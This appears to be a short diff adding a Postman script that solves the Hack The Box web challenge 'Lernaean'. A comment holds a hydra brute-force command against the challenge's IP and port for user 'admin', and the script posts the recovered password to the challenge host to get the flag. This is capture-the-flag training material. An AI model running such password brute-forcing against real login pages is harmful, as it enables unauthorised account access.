@@ -1,0 +1,55 @@
+//Hackthebox - WEB - Lernaean [by Arrexel] 
+
+//Brute force with hydra then post as fast as you can to capture the flag
+
+//sudo hydra 139.59.202.58 -s 31330 http-post-form "/:password=^PASS^:Invalid password" -l admin -P wordlist.txt -V
+
+
+
+const $ = cheerio.load(responseBody);
+
+
+
+var password = 'leonardo';
+
+var newHtml = $.html();
+
+
+
+const postRequest = {
+
+    url: 'http://docker.hackthebox.eu:31330', 
+
+    method: 'POST',
+
+    body: {
+
+        mode: 'formdata',
+
+          formdata: [
+
+            {key: "password", value: password, disabled: false}
+
+        ]
+
+    }
+
+};
+
+
+
+try {
+
+    pm.sendRequest(postRequest, function (err, res) {
+
+        console.log("Response" + res.stream.toString());
+
+    });
+
+}
+
+catch (e) { 
+
+    console.log("error->" + e);
+
+}
